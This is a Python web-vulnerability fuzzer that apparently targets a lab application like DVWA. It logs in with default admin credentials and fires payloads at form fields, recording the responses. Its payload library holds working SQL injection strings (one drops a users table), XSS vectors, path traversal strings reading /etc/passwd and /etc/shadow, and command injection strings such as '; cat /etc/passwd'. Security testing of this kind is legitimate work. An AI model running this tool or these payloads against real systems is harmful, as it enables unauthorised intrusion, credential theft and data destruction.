import requests
import time
from urllib.parse import urljoin

class Fuzzer:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Scanner Research Tool)'
        })
        self._login()
        self.payloads = self._load_payloads()

    def _login(self):
        """Re-authenticate session for fuzzing"""
        try:
            login_url = urljoin(self.base_url, '/login.php')
            response = self.session.get(login_url, timeout=10)
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(response.text, 'html.parser')
            token_field = soup.find('input', {'name': 'user_token'})
            token = token_field['value'] if token_field else ''
            login_data = {
                'username': 'admin',
                'password': 'password',
                'Login': 'Login',
                'user_token': token
            }
            self.session.post(login_url, data=login_data, timeout=10)
        except Exception as e:
            print(f"[!] Fuzzer login failed: {e}")

    def _load_payloads(self):
        """Context-aware payload library"""
        return {
            'sqli': [
                "' OR '1'='1",
                "' OR '1'='1' --",
                "'; DROP TABLE users; --",
                "' UNION SELECT null, username, password FROM users --",
                "1' AND SLEEP(3) --",
                "' OR 1=1 LIMIT 1 --",
                "admin'--",
                "' OR 'x'='x",
                "1; SELECT * FROM users",
                "' AND 1=2 UNION SELECT 1,2,3 --"
            ],
            'xss': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "javascript:alert('XSS')",
                "<body onload=alert('XSS')>",
                "'\"><script>alert('XSS')</script>",
                "<iframe src=javascript:alert('XSS')>",
                "<input onfocus=alert('XSS') autofocus>",
                "<<SCRIPT>alert('XSS')<</SCRIPT>",
                "<ScRiPt>alert('XSS')</ScRiPt>"
            ],
            'path_traversal': [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "..%252f..%252f..%252fetc%252fpasswd",
                "/etc/passwd",
                "../../etc/shadow",
                "../etc/passwd%00",
                "....//....//etc/passwd",
                "%2F%2F%2Fetc%2Fpasswd"
            ],
            'cmd_injection': [
                "-ls",
                "--ls",
                "; ls -la",
                "| ls -la",
                "&& ls -la",
                "& ls -la",
                "; ls",
                "| ls",
                "&& ls",
                "; whoami",
                "| whoami",
                "&& whoami",
                "; id",
                "| id",
                "&& id",
                "&& cat /etc/passwd",
                "; cat /etc/passwd",
                "| cat /etc/passwd",
                "`whoami`",
                "$(whoami)",
                "`id`",
                "$(id)",
                "& dir",
                "| dir"
            ]
        }

    def _get_context(self, input_field):
        """Determine appropriate payload type based on input context"""
        name = input_field.get('name', '').lower()
        input_type = input_field.get('type', 'text').lower()

        if any(k in name for k in ['id', 'user', 'name', 'pass', 'search', 'query', 'q']):
            return 'sqli'
        elif any(k in name for k in ['comment', 'message', 'text', 'input', 'content']):
            return 'xss'
        elif any(k in name for k in ['file', 'path', 'dir', 'folder', 'page', 'include']):
            return 'path_traversal'
        elif any(k in name for k in ['cmd', 'exec', 'command', 'run', 'ip', 'host']):
            return 'cmd_injection'
        else:
            return 'sqli'  # Default to SQLi for unknown fields

    def fuzz(self, endpoints):
        """Fuzz all discovered endpoints with context-aware payloads"""
        all_responses = []
        total = len(endpoints)

        for i, endpoint in enumerate(endpoints):
            print(f"[*] Fuzzing endpoint {i+1}/{total}: {endpoint['url']}")

            for input_field in endpoint['inputs']:
                context = self._get_context(input_field)
                payloads = self.payloads[context]

                # First get baseline response with normal input
                baseline = self._send_request(
                    endpoint, input_field, 'normal_input', 'baseline'
                )

                # Then fuzz with malicious payloads
                for payload in payloads:
                    response_data = self._send_request(
                        endpoint, input_field, payload, context
                    )
                    if response_data:
                        response_data['baseline'] = baseline
                        all_responses.append(response_data)

        print(f"[*] Fuzzing complete. {len(all_responses)} responses collected")
        return all_responses

    def _send_request(self, endpoint, input_field, payload, payload_type):
        """Send a single request and record the response"""
        try:
            # Build form data - fill all fields
            form_data = {}
            for field in endpoint['inputs']:
                if field['name'] == input_field['name']:
                    form_data[field['name']] = payload
                else:
                    form_data[field['name']] = field.get('value', 'test')

            start_time = time.time()

            if endpoint['method'] == 'POST':
                response = self.session.post(
                    endpoint['url'],
                    data=form_data,
                    timeout=15,
                    allow_redirects=True
                )
            else:
                response = self.session.get(
                    endpoint['url'],
                    params=form_data,
                    timeout=15,
                    allow_redirects=True
                )

            response_time = time.time() - start_time

            return {
                'url': endpoint['url'],
                'method': endpoint['method'],
                'input_field': input_field['name'],
                'payload': payload,
                'payload_type': payload_type,
                'status_code': response.status_code,
                'response_time': response_time,
                'content_length': len(response.content),
                'response_text': response.text[:2000],
                'headers': dict(response.headers)
            }

        except requests.exceptions.Timeout:
            return {
                'url': endpoint['url'],
                'input_field': input_field['name'],
                'payload': payload,
                'payload_type': payload_type,
                'status_code': 0,
                'response_time': 15.0,
                'content_length': 0,
                'response_text': '',
                'headers': {},
                'timeout': True
            }
        except Exception as e:
            print(f"[!] Request error: {e}")
            return None
